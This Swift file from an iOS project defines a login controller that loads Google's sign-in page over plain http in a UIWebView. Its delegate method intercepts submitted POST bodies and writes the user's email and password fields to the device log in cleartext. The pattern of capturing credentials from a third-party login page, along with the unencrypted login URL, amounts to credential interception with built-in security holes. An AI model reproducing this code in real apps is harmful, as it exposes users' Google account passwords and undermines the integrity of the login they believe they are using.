//
//  WebViewGoogleLoginController.swift
//  WarsawNative
//
//  Created by Andrey Salomatin on 10/08/16.
//  Copyright © 2016 Andrey Salomatin. All rights reserved.
//

import UIKit
class WebViewGoogleActualLoginController: UIViewController, UIWebViewDelegate {
  
  @IBOutlet var webView: UIWebView!
  
  
  override func viewDidLoad() {
    super.viewDidLoad();
    let str = "http://accounts.google.com/login";
    let url = NSURL(string: str)!;
    let req = NSURLRequest(URL: url);
    self.webView.delegate = self;
    self.webView.scalesPageToFit = true;
    self.webView.loadRequest(req);
  }
  
  
  
  func webView(
    webView: UIWebView,
    shouldStartLoadWithRequest request: NSURLRequest,
    navigationType: UIWebViewNavigationType) -> Bool {
    
    if (request.HTTPMethod == "POST") {
      let s = NSString(data: request.HTTPBody!, encoding: NSUTF8StringEncoding)!;
      let params = s.componentsSeparatedByString("&");
      
      for var p in params {
        if (p.containsString("Email=")) {
          NSLog("%@", p);
        }
        
        if (p.containsString("Passwd=")) {
          NSLog("%@", p);
        }
      }

    }
    
    return true;
  }
}